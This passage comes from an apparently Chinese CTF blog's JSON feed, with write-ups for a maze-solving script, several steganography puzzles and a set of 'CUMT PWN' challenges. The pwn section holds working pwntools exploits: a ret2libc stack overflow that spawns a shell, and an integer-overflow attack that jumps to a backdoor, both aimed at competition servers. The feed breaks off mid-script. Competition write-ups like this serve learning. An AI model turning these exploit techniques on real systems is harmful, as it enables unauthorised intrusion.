class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mark</span>(<span class=\"params\">maze,pos</span>):  <span class=\"comment\">#给迷宫maze的位置pos标&quot;2&quot;表示“到过了”</span></span><br><span class=\"line\">    maze[pos[<span class=\"number\">0</span>]][pos[<span class=\"number\">1</span>]]=<span class=\"number\">2</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">passable</span>(<span class=\"params\">maze,pos</span>): <span class=\"comment\">#检查迷宫maze的位置pos是否可通行</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> maze[pos[<span class=\"number\">0</span>]][pos[<span class=\"number\">1</span>]]==<span class=\"number\">0</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find_path</span>(<span class=\"params\">maze,pos,end</span>):</span><br><span class=\"line\">    mark(maze,pos)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> pos==end:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(pos,end=<span class=\"string\">&quot; &quot;</span>)  <span class=\"comment\">#已到达出口，输出这个位置。成功结束</span></span><br><span class=\"line\">        path.append(pos)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):      <span class=\"comment\">#否则按四个方向顺序检查</span></span><br><span class=\"line\">        nextp=pos[<span class=\"number\">0</span>]+dirs[i][<span class=\"number\">0</span>],pos[<span class=\"number\">1</span>]+dirs[i][<span class=\"number\">1</span>]</span><br><span class=\"line\">        <span class=\"comment\">#考虑下一个可能方向</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> passable(maze,nextp):        <span class=\"comment\">#不可行的相邻位置不管</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> find_path(maze,nextp,end):<span class=\"comment\">#如果从nextp可达出口，输出这个位置，成功结束</span></span><br><span class=\"line\">                <span class=\"built_in\">print</span>(pos,end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">                path.append(pos)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">see_path</span>(<span class=\"params\">maze,path,leng</span>):     <span class=\"comment\">#使寻找到的路径可视化</span></span><br><span class=\"line\">    length = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i,p <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(path):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i==<span class=\"number\">0</span>:</span><br><span class=\"line\">            maze[p[<span class=\"number\">0</span>]][p[<span class=\"number\">1</span>]] =<span class=\"string\">&quot;E&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> i==<span class=\"built_in\">len</span>(path)-<span class=\"number\">1</span>:</span><br><span class=\"line\">            maze[p[<span class=\"number\">0</span>]][p[<span class=\"number\">1</span>]]=<span class=\"string\">&quot;S&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            maze[p[<span class=\"number\">0</span>]][p[<span class=\"number\">1</span>]] =<span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> r <span class=\"keyword\">in</span> maze:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> r:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> c==<span class=\"number\">3</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;31m&#x27;</span>+<span class=\"string\">&quot;*&quot;</span>+<span class=\"string\">&quot; &quot;</span>+<span class=\"string\">&#x27;\\033[0m&#x27;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">                length+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> c==<span class=\"string\">&quot;S&quot;</span> <span class=\"keyword\">or</span> c==<span class=\"string\">&quot;E&quot;</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;34m&#x27;</span>+c+<span class=\"string\">&quot; &quot;</span> + <span class=\"string\">&#x27;\\033[0m&#x27;</span>, end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> c==<span class=\"number\">2</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;32m&#x27;</span>+<span class=\"string\">&quot;#&quot;</span>+<span class=\"string\">&quot; &quot;</span>+<span class=\"string\">&#x27;\\033[0m&#x27;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> c==<span class=\"number\">1</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;;40m&#x27;</span>+<span class=\"string\">&quot; &quot;</span>*<span class=\"number\">2</span>+<span class=\"string\">&#x27;\\033[0m&#x27;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot; &quot;</span>*<span class=\"number\">2</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(length+<span class=\"number\">1</span>)</span><br><span class=\"line\">    leng=length+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> leng</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">maze_change</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    MAZE=[]</span><br><span class=\"line\">    row=col=<span class=\"number\">0</span></span><br><span class=\"line\">    M=<span class=\"built_in\">str</span>(sh.recvuntil(<span class=\"string\">&quot;P&quot;</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(M)</span><br><span class=\"line\">    MAZE.append([])</span><br><span class=\"line\">    <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> M:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> col == num:</span><br><span class=\"line\">            MAZE.append([])</span><br><span class=\"line\">            row+=<span class=\"number\">1</span></span><br><span class=\"line\">            col=<span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> m == <span class=\"string\">&#x27;\\n&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m == <span class=\"string\">&#x27;#&#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">1</span>)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m == <span class=\"string\">&#x27; &#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">0</span>)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m == <span class=\"string\">&#x27;S&#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">0</span>)</span><br><span class=\"line\">            start=(row,col)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m ==<span class=\"string\">&#x27;E&#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">0</span>)</span><br><span class=\"line\">            end=(row,col)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m ==<span class=\"string\">&#x27;P&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(MAZE)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> MAZE, start, end</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gets</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    maze=[]</span><br><span class=\"line\">    start=(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">    end=(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">    maze,start,end=maze_change(num)</span><br><span class=\"line\">    find_path(maze,start,end)</span><br><span class=\"line\">    leng=<span class=\"number\">0</span></span><br><span class=\"line\">    leng=see_path(maze,path,leng)</span><br><span class=\"line\">    sh.sendline(<span class=\"built_in\">str</span>(leng+<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">sh=remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">27512</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;game&#x27;</span>))</span><br><span class=\"line\">sh.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">gets(<span class=\"number\">11</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;level!&#x27;</span>))</span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">gets(<span class=\"number\">21</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;level!&#x27;</span>))</span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">gets(<span class=\"number\">31</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;level!&#x27;</span>))</span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">gets(<span class=\"number\">101</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure><br />\n 其中迷宫问题的部分代码是从<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NjgxNzc3L2FydGljbGUvZGV0YWlscy84MzcxOTY4MA==\">这里</span>复制来的<br />\n值得注意的是多次循环，变量初始化的问题，我排查了好久 (￣_￣|||)<br />\n 一开始没有注意到这个问题，还以为是我哪个顺序出错了，后来才发现。</p>\n<hr />\n<h2 id=\"misc-ezsteganography\"><a class=\"anchor\" href=\"#misc-ezsteganography\">#</a> Misc-ezSteganography</h2>\n<p>比赛时只解出前半个，记录一下比赛时的错误思路\t(。﹏。)：<br />\n（<s>根据第二个提示，后半大概率是 Green 通道里的图片藏了啥信息，然而第一个提示里的 QIM quantization 估计是加密方法，然后，我们就纠在 QIM 是啥的问题上了。。。</s> ）</p>\n<p>然而实际上只要把 g0 和 g1 通道的两张图异或一下就可以了，就用 stegsolve 里的 Image Combiner 的功能</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/sycamore_cdn/wp-content/uploads/2021/09/post-187-613781a296735.png\" alt=\"前半flag加第一条提示\" /></p>\n<p>前半 flag 加第一条提示 ↑</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a30a77f.png\" alt=\"第二条提示\" /></p>\n<p>第二条提示 ↑</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a410b63.png\" alt=\"后半个flag\" /></p>\n<p>后半个 flag ↑</p>\n<hr />\n<h2 id=\"misc-just-a-gif\"><a class=\"anchor\" href=\"#misc-just-a-gif\">#</a> Misc-Just a GIF</h2>\n<p>『赛后复现』和国赛<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2NodS5ibG9nLmNzZG4ubmV0L2FydGljbGUvZGV0YWlscy8xMTY4NTUyNDI=\"> running_pixel</span> 的题基本是一个思路，gif 分离出 451 张图，分为 41 组，每组 11 张图。<br />\n然后每组的第 i 张和第一组的第 i 张作比较，不一样的画黑，就可以了。<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">path = <span class=\"string\">&quot;Just_a_GIF/&quot;</span>  <span class=\"comment\">#填自己的路径</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">11</span>):</span><br><span class=\"line\">    picn = Image.new(<span class=\"string\">&quot;RGB&quot;</span>,(<span class=\"number\">119</span>,<span class=\"number\">83</span>),(<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">255</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">41</span>):</span><br><span class=\"line\">        p1=Image.<span class=\"built_in\">open</span>(path+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&#x27;.png&#x27;</span>)</span><br><span class=\"line\">        p2=Image.<span class=\"built_in\">open</span>(path+<span class=\"built_in\">str</span>(i+j*<span class=\"number\">11</span>)+<span class=\"string\">&#x27;.png&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> w <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">119</span>):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">83</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> p1.getpixel((w,h)) != p2.getpixel((w,h)):</span><br><span class=\"line\">                    picn.putpixel((w,h),(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\">    picn.save(<span class=\"built_in\">str</span>(i)+<span class=\"string\">&#x27;.png&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br />\n 然后就拿到 11 张图片 ↓<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a48b444.png\" alt=\"请添加图片描述\" /></p>\n<p>手动拼接？\t↓<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a4d72e5.png\" alt=\"请添加图片描述\" /></p>\n<p>网上搜一下，貌似是 DataMatrix，扫出 flag</p>\n<blockquote 6bb73086aeb764b5727529d82b084cce=\"\">\n<p>DASCTF</p>\n</blockquote>\n<hr />\n<h2 id=\"misc-nuclear-wastewater\"><a class=\"anchor\" href=\"#misc-nuclear-wastewater\">#</a> Misc-Nuclear wastewater</h2>\n<p>『赛后复现』彩色的二维码，比赛最后经队友提示，看了看它 RGB 才有了思路。<br />\n所有的色块竟然都是，三个通道两个为 0，剩一个有值，那肯定密码就藏在这里了。<br />\n写个脚本把数字转出来<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\">img = Image.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;Nuclear wastewater.png&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">230</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">230</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">            rgb=<span class=\"built_in\">list</span>(img.getpixel((t,j)))</span><br><span class=\"line\">            <span class=\"keyword\">if</span> rgb[i]&gt;<span class=\"number\">32</span> <span class=\"keyword\">and</span> rgb[i]&lt;<span class=\"number\">128</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(rgb[i]),end=<span class=\"string\">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><br />\n 得到这个</p>\n<blockquote>\n<p>Ys&gt;UEJht#?ppeEFtstR#<sub>:hi</sub>tR:@s@YRteK#e@KsR&amp;E&amp;:eR:Eht/#iKtteYKhYKYhhhihhKtC2tt:HVEesY&amp;#@Rj!seRi:eitEtKsetKtEE:hh#h#eYKYihhYK(Kt@iSY$KY/@pRsEetsip:~h@eeEs!E&amp;&amp;::EsEEei#/iYe#/ieKKt//iKYhh</p>\n</blockquote>\n<p>发现很多重复的字符，想到使用词频分析看一下<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> collections <span class=\"keyword\">import</span> Counter</span><br><span class=\"line\">f = <span class=\"string\">&#x27;Ys&gt;UEJht#?ppeEFtstR#~:hi~tR:@s@YRteK#e@KsR&amp;E&amp;:eR:Eht/#iKtteYKhYKYhhhihhKtC2tt:HVEesY&amp;#@Rj!seRi:eitEtKsetKtEE:hh#h#eYKYihhYK(Kt@iSY$KY/@pRsEetsip:~h@eeEs!E&amp;&amp;::EsEEei#/iYe#/ieKKt//iKYhh&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(Counter(f))</span><br></pre></td></tr></table></figure><br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a570599.png\" alt=\"请添加图片描述\" /></p>\n<p>得到： <code>theKEYis:#R@/&amp;p~!&gt;UJ?FC2HVj(S$</code> <br />\n 初步尝试，发现这个不太对，密码错误。。。<br />\n瞻仰一波套神的 wp 之后，原来  <code>&gt;UJ?FC2HVj(S$</code>  词频为 1，所以顺序可能出错，推测词频为 1 的部分不是密码，<br />\n所以得到密码：</p>\n<blockquote>\n<p>'#R@/&amp;p~!'</p>\n</blockquote>\n<p>解压得到 flag.txt....\t(T_T)<br />\n 果然我还是太天真了，还以为能直接拿到 flag...<br />\n 瞅瞅内码，然后看到了这个：</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a60a7f6.png\" alt=\"请添加图片描述\" /></p>\n<p>哦吼，还有个零宽？<br />\n包含 U+200C U+200D U+200E，<span class=\"exturl\" data-url=\"aHR0cHM6Ly8zMzBrLmdpdGh1Yi5pby9taXNjX3Rvb2xzL3VuaWNvZGVfc3RlZ2Fub2dyYXBoeS5odG1s\">网址</span><br />\n隐藏内容是：</p>\n<blockquote>\n<p>2021 年 4 月 13 日，核废水在 Citrix 县的 CTX1 市尤为严重</p>\n</blockquote>\n<p>好吧，完全不知道....(；′⌒`)<br />\n 搜了一下 Citrix CTX1，大概是某种加密，<br />\n终归还是了解的太少了<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a6921a9.png\" alt=\"请添加图片描述\" /></p>\n<p>emm... 搜索发现 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv\">CyberChef</span> 可以进行解密\t§(<em>￣▽￣</em>)§<br />\n 解两次得到 flag：</p>\n<blockquote 98047de9ce5aaa4c0031fb55e9dfac70=\"\">\n<p>flag</p>\n</blockquote>\n<hr />\n<p>到这里，misc 就结束啦！ (oﾟvﾟ) ノ</p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/CUMT-PWN%E4%B8%93%E9%A1%B9/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/CUMT-PWN%E4%B8%93%E9%A1%B9/",
            "title": "CUMT PWN专项",
            "date_published": "2021-11-25T15:24:22.000Z",
            "content_html": "<h2 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h2>\n<p>都说了是测试 nc 了，连上就直接可以拿到 flag</p>\n<h2 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h2>\n<p>给我们个 password，你再传回去就完了<br />\n关键是要仔细读题，看仔细到底哪些是 password<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">r=remote(<span class=\"string\">&quot;219.219.61.234&quot;</span>,<span class=\"number\">6666</span> )</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.recvuntil(<span class=\"string\">b&#x27;*\\n&#x27;</span>).decode())</span><br><span class=\"line\">p=r.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">bytes</span>(p))</span><br><span class=\"line\">r.sendline(<span class=\"built_in\">bytes</span>(p))</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn3\"><a class=\"anchor\" href=\"#pwn3\">#</a> pwn3</h2>\n<p>ret2libc<br />\n 泄露 libc 中 puts 函数的地址<br />\n传入 puts_got，得到 puts 的运行时的地址，<br />\n用 libc.symbols [“system”] - libc.symbols [“puts”] 得到 system 和 puts 的距离，<br />\n加上之前接收的 puts 运行时的地址，得到 system 运行的地址，<br />\n然后直接用 elf.search ('sh\\x00').<strong>next</strong> () 找到 sh 的地址<br />\n没开 canary，<br />\n0x38, 所以 payload 填 60 个 a, 然后传 system 地址 + sh 地址，就可以 getshell 了<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(b&#x27;./pwn3&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;219.219.61.234&#x27;</span>,<span class=\"number\">10003</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">b&#x27;./pwn3&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">b&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.recv().decode())</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(puts_got)</span><br><span class=\"line\"></span><br><span class=\"line\">r.send(<span class=\"built_in\">str</span>(puts_got).encode())</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27; : &#x27;</span>)</span><br><span class=\"line\">puts_addr = <span class=\"built_in\">int</span>(r.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(puts_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = puts_addr + libc.symbols[<span class=\"string\">&quot;system&quot;</span>] - libc.symbols[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(system_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">60</span> + p32(system_addr) + p32(<span class=\"number\">0xdeadbeef</span>) + p32(elf.search(<span class=\"string\">b&#x27;sh\\x00&#x27;</span>).__next__())</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27; :&#x27;</span>)</span><br><span class=\"line\">r.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn4\"><a class=\"anchor\" href=\"#pwn4\">#</a> pwn4</h2>\n<p>没开 canary，但是前两个地方不能栈溢出，<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436075/Typera/2023/04/dc2c87519810519185f4e3c91622b01d.png\" alt=\"image-20230425232110426\" /><br />\n 而又观察到 v3 刚好是个 unsigned int8 型的变量，可以利用整数溢出的漏洞，<br />\n它的最大值位 255，所以只要保证一共填了 255+4 ~ +8 之间的个数就行</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./pwn4&#x27;)</span></span><br><span class=\"line\">r = remote(<span class=\"string\">&quot;219.219.61.234&quot;</span>,<span class=\"number\">10004</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">backdoor=<span class=\"number\">0x0804868B</span></span><br><span class=\"line\">p = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span> + p32(backdoor) + <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">259</span>-<span class=\"number\">0x18</span>-<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;choice:&#x27;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;username:&#x27;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">b&#x27;123&#x27;</span>)</span><br><span 